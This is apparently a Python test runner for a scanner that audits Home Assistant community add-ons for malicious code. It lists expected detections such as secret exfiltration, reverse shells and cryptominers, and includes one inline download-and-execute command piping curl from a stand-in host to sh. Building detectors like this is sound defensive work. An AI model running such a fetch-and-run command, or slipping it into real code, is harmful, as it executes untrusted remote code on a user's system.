#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (things popular integrations and cards really do) must scan SAFE; every med-* fixture
must surface as exactly MEDIUM (reviewable, never scored as an attack). The fixtures are inert:
hosts are reserved (.invalid / .example / TEST-NET), credentials are obviously fake, and nothing
here is ever imported or executed by the tests.

    python tests/run.py
"""
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import hacs_audit as ha  # noqa: E402

EXPECT = {
    "mal-secrets-exfil": ("CRITICAL", "ha_secret_exfil"),
    "mal-token-mint": ("CRITICAL", "ha_token_exfil"),
    "mal-import-curl-sh": ("CRITICAL", "download_execute"),
    "mal-reverse-shell": ("CRITICAL", "reverse_shell"),
    "mal-obfuscated-exec": ("CRITICAL", "obfuscated_exec"),
    "mal-remote-exec": ("CRITICAL", "remote_code_exec"),
    "mal-persistence": ("CRITICAL", "persistence"),
    "mal-etc-write": ("CRITICAL", "etc_write"),
    "mal-shadow-wheel": ("HIGH", "shadow_wheel"),
    "mal-typosquat": ("MEDIUM", "typosquat"),
    "mal-miner": ("CRITICAL", "cryptominer"),
    "mal-exec-route": ("HIGH", "exec_route"),
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-card-token-exfil": ("CRITICAL", "ha_token_exfil"),
    "mal-card-token-send": ("HIGH", "ha_token_send"),
    "mal-card-remote-eval": ("CRITICAL", "download_execute"),
}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = ha.scan_target(ha.files_from_dir(os.path.join(root, name)), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = ha.SEV_ORDER[r["risk_level"]] >= ha.SEV_ORDER[want] and fid in ids
        elif name.startswith("med-"):
            ok = r["risk_level"] == "MEDIUM"
        else:
            ok = r["risk_level"] == "SAFE"
        print("%s %-26s %-8s %s" % ("PASS" if ok else "FAIL", name, r["risk_level"], ",".join(ids)))
        fails += not ok
    for m in sorted(set(EXPECT) - set(os.listdir(root))):
        print("FAIL %-26s missing fixture" % m)
        fails += 1
    # --text treats a string as import-time Python
    r = ha.scan("import os\nos.system('curl https://x.invalid/a.sh | sh')")
    ok = r["risk_level"] == "CRITICAL"
    print("%s --text download_execute -> %s" % ("PASS" if ok else "FAIL", r["risk_level"]))
    fails += not ok
    # a bare custom_components/<domain> directory is laid out like a repo
    files = ha._component_dir_files(os.path.join(root, "mal-etc-write", "custom_components", "demo"), "demo")
    ok = ha.scan_target(files, "bare")["risk_level"] == "CRITICAL"
    print("%s bare component dir -> scanned as integration" % ("PASS" if ok else "FAIL"))
    fails += not ok
    # nothing in scope (TypeScript-only checkout, release asset unavailable) is INCOMPLETE, not SAFE
    r = ha.scan_target({"src/card.ts": "export class Card {}", "hacs.json": "{}"}, "ts-only")
    ok = r.get("incomplete") is True and r["scanned_files"] == 0
    print("%s nothing scannable -> incomplete" % ("PASS" if ok else "FAIL"))
    fails += not ok
    # performance: a 5 MB single-line minified card bundle must scan quickly
    blob = ("var a=function(b){return b+1};" * 170000)[:5000000]
    t0 = time.time()
    ha.scan_target({"dist/card.js": blob}, "perf")
    dt = time.time() - t0
    ok = dt < 10
    print("%s 5 MB single-line bundle in %.1fs" % ("PASS" if ok else "FAIL", dt))
    fails += not ok
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
